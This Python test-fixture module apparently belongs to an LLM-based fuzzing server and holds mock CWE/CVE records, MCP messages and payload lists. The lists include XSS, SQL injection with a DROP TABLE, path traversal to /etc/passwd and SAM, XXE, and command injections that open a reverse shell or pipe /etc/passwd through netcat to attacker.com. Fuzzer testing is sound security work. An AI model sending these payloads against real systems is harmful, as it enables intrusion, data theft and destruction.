"""
HyFuzz MCP Server - Mock Test Data

This module provides comprehensive mock data for testing the HyFuzz MCP server.
Includes sample CWE/CVE data, payloads, requests/responses, and LLM outputs.

Key Features:
- Sample CWE (Common Weakness Enumeration) data
- Sample CVE (Common Vulnerabilities and Exposures) data
- Payload examples for different vulnerability types
- HTTP requests and responses
- MCP protocol examples
- LLM CoT reasoning chains
- Execution results
- Protocol-specific payload examples

Usage:
    >>> from tests.fixtures.mock_data import (
    ...     SAMPLE_CWE_DATA,
    ...     SAMPLE_CVE_DATA,
    ...     SAMPLE_PAYLOADS,
    ... )
    >>>
    >>> # Use mock data in tests
    >>> cwe_79_data = SAMPLE_CWE_DATA["CWE-79"]
    >>> xss_payload = SAMPLE_PAYLOADS["xss"][0]

Author: HyFuzz Team
Version: 1.0.0
"""

from typing import Dict, List, Any


# ==============================================================================
# Sample CWE Data
# ==============================================================================

SAMPLE_CWE_DATA: Dict[str, Dict[str, Any]] = {
    "CWE-79": {
        "id": "CWE-79",
        "name": "Improper Neutralization of Input During Web Page Generation "
                "('Cross-site Scripting')",
        "description": "The software receives input from an upstream component "
                      "and sends it to an external recipient, but it does not "
                      "neutralize or incorrectly neutralizes special characters "
                      "that could modify the intended output.",
        "severity": "MEDIUM",
        "cvss_base_score": 6.1,
        "affected_technologies": ["Web Applications", "JavaScript", "HTML"],
        "affected_protocols": ["HTTP", "HTTPS", "WebSocket"],
        "common_consequences": [
            "Read Application Data",
            "Execute Unauthorized Code or Commands",
            "Modify Application Data",
        ],
        "remediation": [
            "Validate and sanitize all user inputs",
            "Use output encoding appropriate to context",
            "Implement Content Security Policy (CSP)",
            "Use templating engines with auto-escaping",
        ],
        "examples": [
            {
                "code": '<img src=x onerror="alert(\'XSS\')">',
                "description": "Basic alert-based XSS",
                "severity": "HIGH",
            },
            {
                "code": '<svg onload=alert("XSS")>',
                "description": "SVG-based XSS",
                "severity": "HIGH",
            },
            {
                "code": "javascript:alert('XSS')",
                "description": "JavaScript protocol handler",
                "severity": "MEDIUM",
            },
        ],
    },
    "CWE-89": {
        "id": "CWE-89",
        "name": "Improper Neutralization of Special Elements used in an SQL Command "
                "('SQL Injection')",
        "description": "The software constructs all or part of an SQL command using "
                      "externally-influenced input from an upstream component, but "
                      "it does not neutralize or incorrectly neutralizes special "
                      "elements that could modify the intended SQL command.",
        "severity": "CRITICAL",
        "cvss_base_score": 9.8,
        "affected_technologies": ["Databases", "Web Applications"],
        "affected_protocols": ["HTTP", "HTTPS", "Database Protocol"],
        "common_consequences": [
            "Read Unauthorized Data",
            "Modify Data",
            "Execute Unauthorized Code",
        ],
        "remediation": [
            "Use parameterized queries/prepared statements",
            "Use stored procedures with bound parameters",
            "Validate and sanitize inputs",
            "Apply principle of least privilege to database accounts",
        ],
        "examples": [
            {
                "code": "' OR '1'='1",
                "description": "Classic authentication bypass",
                "severity": "CRITICAL",
            },
            {
                "code": "1; DROP TABLE users; --",
                "description": "Data deletion attack",
                "severity": "CRITICAL",
            },
        ],
    },
    "CWE-78": {
        "id": "CWE-78",
        "name": "Improper Neutralization of Special Elements used in an OS Command "
                "('OS Command Injection')",
        "description": "The software constructs all or part of an OS command using "
                      "externally-influenced input without properly neutralizing "
                      "special elements that could modify the intended command.",
        "severity": "CRITICAL",
        "cvss_base_score": 9.8,
        "affected_technologies": ["Operating Systems", "Web Applications"],
        "affected_protocols": ["Multiple"],
        "common_consequences": [
            "Execute Unauthorized Code",
            "Read System Data",
            "Modify System Data",
        ],
        "remediation": [
            "Avoid using OS command execution APIs",
            "Use safer APIs (e.g., subprocess with list arguments)",
            "Validate and sanitize inputs strictly",
            "Use allowlist validation",
        ],
        "examples": [
            {
                "code": "; cat /etc/passwd #",
                "description": "File disclosure attack",
                "severity": "CRITICAL",
            },
            {
                "code": "| nc attacker.com 1234",
                "description": "Reverse shell creation",
                "severity": "CRITICAL",
            },
        ],
    },
    "CWE-22": {
        "id": "CWE-22",
        "name": "Improper Limitation of a Pathname to a Restricted Directory "
                "('Path Traversal')",
        "description": "The software uses external input to construct a pathname "
                      "that is intended to identify a file or directory that is "
                      "located below a restricted parent directory, but the software "
                      "does not properly neutralize sequences such as '..' that can "
                      "refer to a location outside that parent directory.",
        "severity": "HIGH",
        "cvss_base_score": 7.5,
        "affected_technologies": ["File Systems", "Web Applications"],
        "affected_protocols": ["HTTP", "HTTPS"],
        "common_consequences": [
            "Read Unauthorized Data",
            "Modify Data",
            "Execute Unauthorized Code",
        ],
        "remediation": [
            "Use allowlist validation",
            "Canonicalize paths",
            "Use sandboxing",
            "Implement proper access controls",
        ],
        "examples": [
            {
                "code": "../../../../etc/passwd",
                "description": "Unix file disclosure",
                "severity": "HIGH",
            },
            {
                "code": "..\\..\\..\\windows\\system32\\config\\sam",
                "description": "Windows registry access",
                "severity": "HIGH",
            },
        ],
    },
    "CWE-434": {
        "id": "CWE-434",
        "name": "Unrestricted Upload of File with Dangerous Type",
        "description": "The software allows the attacker to upload or transfer files "
                      "of dangerous types that can be automatically processed within "
                      "the environment.",
        "severity": "HIGH",
        "cvss_base_score": 8.8,
        "affected_technologies": ["Web Applications", "File Systems"],
        "affected_protocols": ["HTTP", "HTTPS"],
        "common_consequences": [
            "Execute Unauthorized Code",
            "Modify Application Data",
        ],
        "remediation": [
            "Validate file types",
            "Store files outside webroot",
            "Disable script execution in upload directory",
            "Use virus scanning",
        ],
        "examples": [
            {
                "code": "shell.php",
                "description": "PHP webshell upload",
                "severity": "CRITICAL",
            },
        ],
    },
}


# ==============================================================================
# Sample CVE Data
# ==============================================================================

SAMPLE_CVE_DATA: Dict[str, Dict[str, Any]] = {
    "CVE-2021-3129": {
        "id": "CVE-2021-3129",
        "title": "Laravel Framework RCE via ignition package",
        "description": "Laravel before 8.4.2 allows unauthenticated remote code "
                      "execution through the ignition error page component.",
        "severity": "CRITICAL",
        "cvss_v3_score": 9.8,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "affected_versions": ["<8.4.2"],
        "affected_component": "ignition package",
        "cwe_ids": ["CWE-94"],  # Code Injection
        "published_date": "2021-03-09",
        "remediation": "Update Laravel to version 8.4.2 or later",
        "payload_examples": [
            "GET /ignition/execute-solution?solution=Illuminate%5CHashing%5CBcryptHasher",
        ],
    },
    "CVE-2021-21224": {
        "id": "CVE-2021-21224",
        "title": "Chrome V8 Out of Bounds Write",
        "description": "V8 in Google Chrome before 90.0.4430.93 allows remote code "
                      "execution due to an out-of-bounds write in the V8 engine.",
        "severity": "CRITICAL",
        "cvss_v3_score": 8.8,
        "affected_versions": ["<90.0.4430.93"],
        "affected_component": "V8 JavaScript Engine",
        "cwe_ids": ["CWE-787"],  # Out-of-bounds Write
        "published_date": "2021-04-13",
        "remediation": "Update Chrome to version 90.0.4430.93 or later",
    },
    "CVE-2021-3156": {
        "id": "CVE-2021-3156",
        "title": "Sudo Buffer Overflow",
        "description": "A buffer overflow in the sudoers parser could allow a "
                      "local attacker to gain root privileges.",
        "severity": "HIGH",
        "cvss_v3_score": 7.8,
        "affected_versions": ["<1.9.5p2"],
        "affected_component": "sudo",
        "cwe_ids": ["CWE-119"],  # Buffer Overflow
        "published_date": "2021-01-26",
        "remediation": "Update sudo to version 1.9.5p2 or later",
    },
    "CVE-2020-1938": {
        "id": "CVE-2020-1938",
        "title": "Apache Tomcat AJP Ghostcat",
        "description": "When using the Apache JServ Protocol (AJP), Tomcat does not "
                      "properly validate incoming connections, allowing attackers to "
                      "access arbitrary files.",
        "severity": "HIGH",
        "cvss_v3_score": 7.5,
        "affected_versions": ["<9.0.31", "<8.5.51", "<7.0.100"],
        "affected_component": "Apache Tomcat",
        "cwe_ids": ["CWE-99"],  # Improper Control of Resource Identifiers
        "published_date": "2020-02-24",
        "remediation": "Update Tomcat or disable AJP port",
    },
}


# ==============================================================================
# Sample Payloads
# ==============================================================================

SAMPLE_PAYLOADS: Dict[str, List[Dict[str, Any]]] = {
    "xss": [
        {
            "id": "xss_basic_alert",
            "protocol": "HTTP",
            "payload": '<img src=x onerror="alert(\'XSS\')">',
            "encoding": "none",
            "description": "Basic alert-based XSS",
            "cwe_id": "CWE-79",
            "effectiveness": 0.85,
        },
        {
            "id": "xss_svg_onload",
            "protocol": "HTTP",
            "payload": '<svg onload="alert(\'XSS\')">',
            "encoding": "none",
            "description": "SVG-based XSS",
            "cwe_id": "CWE-79",
            "effectiveness": 0.82,
        },
        {
            "id": "xss_html_entity_encoded",
            "protocol": "HTTP",
            "payload": "&lt;img src=x onerror=alert(&#39;XSS&#39;)&gt;",
            "encoding": "html_entities",
            "description": "HTML entity encoded XSS",
            "cwe_id": "CWE-79",
            "effectiveness": 0.65,
        },
        {
            "id": "xss_url_encoded",
            "protocol": "HTTP",
            "payload": "%3Cimg%20src%3Dx%20onerror%3D%22alert%28%27XSS%27%29%22%3E",
            "encoding": "url",
            "description": "URL encoded XSS",
            "cwe_id": "CWE-79",
            "effectiveness": 0.78,
        },
    ],
    "sql_injection": [
        {
            "id": "sqli_basic_or",
            "protocol": "HTTP",
            "payload": "' OR '1'='1",
            "encoding": "none",
            "description": "Classic authentication bypass",
            "cwe_id": "CWE-89",
            "effectiveness": 0.92,
        },
        {
            "id": "sqli_drop_table",
            "protocol": "HTTP",
            "payload": "1; DROP TABLE users; --",
            "encoding": "none",
            "description": "Data destruction payload",
            "cwe_id": "CWE-89",
            "effectiveness": 0.88,
        },
        {
            "id": "sqli_union_select",
            "protocol": "HTTP",
            "payload": "' UNION SELECT NULL,username,password FROM users--",
            "encoding": "none",
            "description": "Data exfiltration via UNION",
            "cwe_id": "CWE-89",
            "effectiveness": 0.85,
        },
        {
            "id": "sqli_time_based_blind",
            "protocol": "HTTP",
            "payload": "' AND SLEEP(5)--",
            "encoding": "none",
            "description": "Time-based blind SQL injection",
            "cwe_id": "CWE-89",
            "effectiveness": 0.72,
        },
    ],
    "command_injection": [
        {
            "id": "cmdi_unix_passwd",
            "protocol": "HTTP",
            "payload": "; cat /etc/passwd #",
            "encoding": "none",
            "description": "Unix password file disclosure",
            "cwe_id": "CWE-78",
            "effectiveness": 0.90,
        },
        {
            "id": "cmdi_reverse_shell",
            "protocol": "HTTP",
            "payload": "; bash -i >& /dev/tcp/attacker.com/4444 0>&1 #",
            "encoding": "none",
            "description": "Reverse shell creation",
            "cwe_id": "CWE-78",
            "effectiveness": 0.88,
        },
        {
            "id": "cmdi_windows_whoami",
            "protocol": "HTTP",
            "payload": "& whoami",
            "encoding": "none",
            "description": "Windows command execution",
            "cwe_id": "CWE-78",
            "effectiveness": 0.85,
        },
        {
            "id": "cmdi_pipe_nc",
            "protocol": "HTTP",
            "payload": "| nc attacker.com 1234 < /etc/passwd",
            "encoding": "none",
            "description": "Data exfiltration via netcat",
            "cwe_id": "CWE-78",
            "effectiveness": 0.82,
        },
    ],
    "path_traversal": [
        {
            "id": "path_unix_passwd",
            "protocol": "HTTP",
            "payload": "../../../../etc/passwd",
            "encoding": "none",
            "description": "Unix password file access",
            "cwe_id": "CWE-22",
            "effectiveness": 0.88,
        },
        {
            "id": "path_windows_registry",
            "protocol": "HTTP",
            "payload": "..\\..\\..\\windows\\system32\\config\\sam",
            "encoding": "none",
            "description": "Windows SAM registry access",
            "cwe_id": "CWE-22",
            "effectiveness": 0.85,
        },
        {
            "id": "path_url_encoded",
            "protocol": "HTTP",
            "payload": "..%2f..%2f..%2fetc%2fpasswd",
            "encoding": "url",
            "description": "URL encoded path traversal",
            "cwe_id": "CWE-22",
            "effectiveness": 0.72,
        },
        {
            "id": "path_double_encoded",
            "protocol": "HTTP",
            "payload": "..%252f..%252f..%252fetc%252fpasswd",
            "encoding": "double_url",
            "description": "Double URL encoded path traversal",
            "cwe_id": "CWE-22",
            "effectiveness": 0.65,
        },
    ],
    "xxe": [
        {
            "id": "xxe_file_disclosure",
            "protocol": "HTTP",
            "payload": '<?xml version="1.0"?><!DOCTYPE foo ['
                      '<!ENTITY xxe SYSTEM "file:///etc/passwd">'
                      ']><foo>&xxe;</foo>',
            "encoding": "none",
            "description": "XXE file disclosure attack",
            "cwe_id": "CWE-611",
            "effectiveness": 0.80,
        },
        {
            "id": "xxe_dtd_external",
            "protocol": "HTTP",
            "payload": '<?xml version="1.0"?><!DOCTYPE foo ['
                      '<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">'
                      ']><foo>&xxe;</foo>',
            "encoding": "none",
            "description": "XXE with external DTD",
            "cwe_id": "CWE-611",
            "effectiveness": 0.75,
        },
    ],
    "coap": [
        {
            "id": "coap_path_traversal",
            "protocol": "CoAP",
            "payload": "../../../../etc/passwd",
            "encoding": "none",
            "description": "CoAP path traversal attack",
            "cwe_id": "CWE-22",
            "effectiveness": 0.78,
        },
        {
            "id": "coap_resource_discovery",
            "protocol": "CoAP",
            "payload": "/.well-known/core",
            "encoding": "none",
            "description": "CoAP resource discovery probe",
            "cwe_id": "CWE-200",
            "effectiveness": 0.95,
        },
    ],
    "mqtt": [
        {
            "id": "mqtt_topic_injection",
            "protocol": "MQTT",
            "payload": "sensor/+/temperature",
            "encoding": "none",
            "description": "MQTT topic wildcard injection",
            "cwe_id": "CWE-89",
            "effectiveness": 0.72,
        },
        {
            "id": "mqtt_auth_bypass",
            "protocol": "MQTT",
            "payload": "{username}:{password}",
            "encoding": "none",
            "description": "MQTT authentication bypass attempt",
            "cwe_id": "CWE-287",
            "effectiveness": 0.65,
        },
    ],
}


# ==============================================================================
# Sample HTTP Requests & Responses
# ==============================================================================

SAMPLE_HTTP_REQUESTS: Dict[str, Dict[str, Any]] = {
    "payload_generation_request": {
        "method": "POST",
        "endpoint": "/api/v1/payloads/generate",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "HyFuzz-Client/1.0",
        },
        "body": {
            "cwe_id": "CWE-79",
            "protocol": "HTTP",
            "target_info": {
                "version": "5.0.0",
                "service": "Apache",
            },
            "encoding": "none",
            "count": 5,
        },
    },
    "vulnerability_analysis_request": {
        "method": "POST",
        "endpoint": "/api/v1/analyze",
        "headers": {
            "Content-Type": "application/json",
        },
        "body": {
            "target_url": "http://target.com/search",
            "parameter": "q",
            "vulnerability_type": "xss",
            "test_payload": '<img src=x onerror="alert(1)">',
        },
    },
}

SAMPLE_HTTP_RESPONSES: Dict[str, Dict[str, Any]] = {
    "payload_generation_response": {
        "status_code": 200,
        "headers": {
            "Content-Type": "application/json",
        },
        "body": {
            "success": True,
            "payloads": [
                '<img src=x onerror="alert(\'XSS\')">',
                '<svg onload="alert(\'XSS\')">',
                '<iframe onload="alert(\'XSS\')">',
            ],
            "reasoning_chain": [
                "Step 1: Identified CWE-79 as a cross-site scripting vulnerability",
                "Step 2: Analyzed target service: Apache version 5.0.0",
                "Step 3: Selected appropriate payload vectors",
                "Step 4: Generated context-specific XSS payloads",
            ],
            "success_probability": 0.82,
            "execution_time_ms": 245,
        },
    },
    "error_response": {
        "status_code": 400,
        "headers": {
            "Content-Type": "application/json",
        },
        "body": {
            "success": False,
            "error": "Invalid CWE ID",
            "code": "INVALID_CWE",
            "details": "CWE-99999 not found in knowledge base",
        },
    },
}


# ==============================================================================
# Sample MCP Messages
# ==============================================================================

SAMPLE_MCP_MESSAGES: Dict[str, Dict[str, Any]] = {
    "initialize_request": {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "initialize",
        "params": {
            "protocolVersion": "2024.01",
            "capabilities": {
                "tools": {},
            },
            "clientInfo": {
                "name": "test-client",
                "version": "1.0.0",
            },
        },
    },
    "initialize_response": {
        "jsonrpc": "2.0",
        "id": 1,
        "result": {
            "protocolVersion": "2024.01",
            "capabilities": {
                "tools": {
                    "listChanged": True,
                },
            },
            "serverInfo": {
                "name": "HyFuzz MCP Server",
                "version": "1.0.0",
            },
        },
    },
    "call_tool_request": {
        "jsonrpc": "2.0",
        "id": 2,
        "method": "tools/call",
        "params": {
            "name": "generate_payloads",
            "arguments": {
                "cwe_id": "CWE-79",
                "protocol": "HTTP",
                "count": 3,
            },
        },
    },
    "call_tool_response": {
        "jsonrpc": "2.0",
        "id": 2,
        "result": {
            "content": [
                {
                    "type": "text",
                    "text": "Generated 3 XSS payloads for CWE-79",
                },
                {
                    "type": "text",
                    "text": '<img src=x onerror="alert(\'XSS\')">',
                },
            ],
        },
    },
}


# ==============================================================================
# Sample LLM Responses & CoT Chains
# ==============================================================================

SAMPLE_LLM_COT_CHAINS: Dict[str, Dict[str, Any]] = {
    "xss_reasoning": {
        "vulnerability": "CWE-79",
        "type": "Cross-Site Scripting (XSS)",
        "reasoning_chain": [
            "Step 1: Analyze vulnerability class - CWE-79 involves improper "
            "neutralization of user input in HTML contexts",
            "Step 2: Identify attack surface - User-controlled input is reflected "
            "in HTTP responses without sanitization",
            "Step 3: Determine payload strategy - Use JavaScript execution vectors "
            "such as event handlers",
            "Step 4: Select encoding - No encoding needed for basic tests, but "
            "can employ HTML entity encoding for filter evasion",
            "Step 5: Generate payloads - Create variations using different event "
            "handlers (onerror, onload, onclick, etc.)",
            "Step 6: Assess effectiveness - Each payload has different bypass "
            "potential depending on filtering mechanisms",
        ],
        "generated_payloads": [
            '<img src=x onerror="alert(\'XSS\')">',
            '<svg onload=alert("XSS")>',
            '<body onload=alert("XSS")>',
        ],
        "confidence_score": 0.92,
    },
    "sql_injection_reasoning": {
        "vulnerability": "CWE-89",
        "type": "SQL Injection",
        "reasoning_chain": [
            "Step 1: Identify vulnerability - CWE-89 SQL injection occurs when "
            "user input is concatenated into SQL queries",
            "Step 2: Determine database type - Common databases include MySQL, "
            "PostgreSQL, SQL Server, Oracle",
            "Step 3: Analyze query structure - Determine if vulnerable parameter "
            "is in WHERE clause, ORDER BY, etc.",
            "Step 4: Select injection technique - Common techniques: UNION-based, "
            "Boolean-based, Time-based, Error-based",
            "Step 5: Craft payload - For authentication bypass: ' OR '1'='1",
            "Step 6: Consider encoding - URL encoding, comment syntax variations",
        ],
        "generated_payloads": [
            "' OR '1'='1",
            "' OR 1=1 --",
            "admin' --",
        ],
        "confidence_score": 0.95,
    },
    "command_injection_reasoning": {
        "vulnerability": "CWE-78",
        "type": "OS Command Injection",
        "reasoning_chain": [
            "Step 1: Understand vulnerability - CWE-78 occurs when user input "
            "is passed to OS command execution functions",
            "Step 2: Identify command context - Unix shell, Windows cmd.exe, "
            "or PowerShell",
            "Step 3: Determine separator - Different shells use different "
            "separators: ; (Unix), & (Windows), && (conditional)",
            "Step 4: Craft injection - Append commands after data: "
            "input; malicious_command",
            "Step 5: Select target command - Common reconnaissance: whoami, "
            "id, uname, dir",
            "Step 6: Encode if needed - Escape special characters, use "
            "alternative representations",
        ],
        "generated_payloads": [
            "; cat /etc/passwd #",
            "| whoami",
            "& ipconfig",
        ],
        "confidence_score": 0.88,
    },
}

SAMPLE_LLM_RESPONSES: Dict[str, str] = {
    "xss_explanation": "This payload exploits CWE-79 by injecting an IMG tag "
                       "with an invalid source, which triggers the onerror event "
                       "handler containing JavaScript code. When the browser "
                       "attempts to load the invalid image source, it executes "
                       "the JavaScript alert() function.",
    "sql_injection_explanation": "This classic SQL injection payload uses a single "
                                 "quote to close the user input context, then appends "
                                 "an OR condition that's always true ('1'='1'), "
                                 "effectively bypassing authentication logic.",
    "command_injection_explanation": "This payload uses a semicolon to terminate "
                                     "the original command, then appends a new "
                                     "command to display system password file, "
                                     "compromising system security.",
}


# ==============================================================================
# Sample Execution Results
# ==============================================================================

SAMPLE_EXECUTION_RESULTS: Dict[str, Dict[str, Any]] = {
    "successful_xss": {
        "payload_id": "xss_basic_alert",
        "status": "success",
        "vulnerability_type": "xss",
        "target": {
            "url": "http://target.com/search",
            "protocol": "HTTP",
        },
        "payload": '<img src=x onerror="alert(\'XSS\')">',
        "response_code": 200,
        "response_body": '<html><body>Search results for: '
                        '<img src=x onerror="alert(\'XSS\')">'
                        '</body></html>',
        "execution_time_ms": 156,
        "evidence": [
            "Alert dialog appeared with payload content",
            "JavaScript executed in browser context",
        ],
        "severity": "HIGH",
    },
    "successful_sql_injection": {
        "payload_id": "sqli_basic_or",
        "status": "success",
        "vulnerability_type": "sql_injection",
        "target": {
            "url": "http://target.com/login",
            "protocol": "HTTP",
        },
        "payload": "' OR '1'='1",
        "response_code": 200,
        "response_body": "Login successful - Welcome Admin",
        "execution_time_ms": 234,
        "evidence": [
            "Authentication bypass successful",
            "Gained unauthorized access",
        ],
        "severity": "CRITICAL",
    },
    "failed_payload": {
        "payload_id": "xss_svg_onload",
        "status": "failed",
        "vulnerability_type": "xss",
        "target": {
            "url": "http://target.com/search",
            "protocol": "HTTP",
        },
        "payload": '<svg onload="alert(\'XSS\')">',
        "response_code": 200,
        "response_body": '<html><body>Search results for: '
                        '&lt;svg onload=&quot;alert(\'XSS\')&quot;&gt;'
                        '</body></html>',
        "execution_time_ms": 145,
        "failure_reason": "Payload was HTML-encoded by WAF",
        "severity": "MITIGATED",
    },
}


# ==============================================================================
# Sample Knowledge Base
# ==============================================================================

SAMPLE_KNOWLEDGE_BASE: Dict[str, Any] = {
    "statistics": {
        "total_cwe_entries": 5,
        "total_cve_entries": 4,
        "total_payloads": 20,
        "last_updated": "2024-01-15T10:30:00Z",
    },
    "cwe_summary": {
        "critical": 2,  # CWE-89, CWE-78
        "high": 2,      # CWE-79, CWE-22
        "medium": 1,    # CWE-434
    },
    "protocol_coverage": {
        "HTTP": 12,
        "HTTPS": 8,
        "CoAP": 2,
        "MQTT": 2,
        "Other": 4,
    },
}


# ==============================================================================
# Sample Config Data
# ==============================================================================

SAMPLE_CONFIG: Dict[str, Any] = {
    "server": {
        "host": "127.0.0.1",
        "port": 8000,
        "debug": True,
    },
    "llm": {
        "provider": "ollama",
        "model": "mistral",
        "api_endpoint": "http://localhost:11434",
        "temperature": 0.7,
        "max_tokens": 2048,
    },
    "knowledge": {
        "data_dir": "data/",
        "cache_enabled": True,
        "cache_ttl": 3600,
    },
}


# ==============================================================================
# Sample Performance Metrics
# ==============================================================================

SAMPLE_PERFORMANCE_METRICS: Dict[str, Dict[str, Any]] = {
    "payload_generation": {
        "avg_response_time_ms": 245,
        "min_response_time_ms": 120,
        "max_response_time_ms": 580,
        "throughput_rps": 4.08,
        "success_rate": 0.98,
        "cache_hit_rate": 0.75,
    },
    "knowledge_retrieval": {
        "avg_cwe_lookup_ms": 12,
        "avg_cve_lookup_ms": 18,
        "avg_graph_traversal_ms": 45,
        "total_queries": 1500,
        "cache_efficiency": 0.92,
    },
    "system_health": {
        "memory_usage_mb": 245,
        "cpu_usage_percent": 18.5,
        "uptime_hours": 48,
        "active_sessions": 12,
    },
}


# ==============================================================================
# Exports
# ==============================================================================

__all__ = [
    "SAMPLE_CWE_DATA",
    "SAMPLE_CVE_DATA",
    "SAMPLE_PAYLOADS",
    "SAMPLE_HTTP_REQUESTS",
    "SAMPLE_HTTP_RESPONSES",
    "SAMPLE_MCP_MESSAGES",
    "SAMPLE_LLM_COT_CHAINS",
    "SAMPLE_LLM_RESPONSES",
    "SAMPLE_EXECUTION_RESULTS",
    "SAMPLE_KNOWLEDGE_BASE",
    "SAMPLE_CONFIG",
    "SAMPLE_PERFORMANCE_METRICS",
]